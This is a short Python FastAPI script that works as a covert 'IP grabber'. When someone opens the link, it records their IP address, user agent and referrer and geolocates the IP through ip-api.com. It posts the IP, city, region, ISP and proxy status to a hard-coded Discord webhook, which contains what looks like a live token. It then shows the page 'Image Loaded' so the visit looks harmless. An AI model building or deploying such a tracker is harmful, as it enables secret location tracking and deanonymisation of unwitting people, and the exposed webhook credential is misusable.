from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests
import traceback

app = FastAPI()

# Replace with your actual Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1508105125166846125/930vrRtV_IZxhSqTTxuBthH7sFWPOw_y8HIOZz9frJcW4wkBlT_l8JQv-e2H00I"

@app.get("/")
async def log_request(request: Request):
    # 1. Get the IP
    forwarded = request.headers.get("x-forwarded-for")
    client_ip = forwarded.split(',')[0].strip() if forwarded else request.client.host
    
    print(f"DEBUG: Connection received from {client_ip}")

    # 2. Get Metadata
    full_ua = request.headers.get("user-agent", "Unknown")
    referrer = request.headers.get("referer", "Direct/None")

    # 3. Lookup details
    try:
        url = f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,isp,proxy,query"
        resp = requests.get(url, timeout=5).json()
        
        if resp.get("status") == "success":
            message = (
                f"**Visitor Log**\n"
                f"IP: `{resp.get('query')}`\n"
                f"Location: `{resp.get('city')}, {resp.get('regionName')}`\n"
                f"ISP: `{resp.get('isp')}` | Proxy: `{resp.get('proxy')}`\n"
                f"Device: `{full_ua[:50]}...`\n"
                f"Referrer: `{referrer}`"
            )
            discord_resp = requests.post(WEBHOOK_URL, json={"content": message}, timeout=5)
            print(f"DEBUG: Discord sent. Status Code: {discord_resp.status_code}")
        else:
            print("DEBUG: IP-API lookup failed.")
            
    except Exception as e:
        print(f"DEBUG ERROR: {traceback.format_exc()}")

    return HTMLResponse(content="<h1>Image Loaded</h1>")
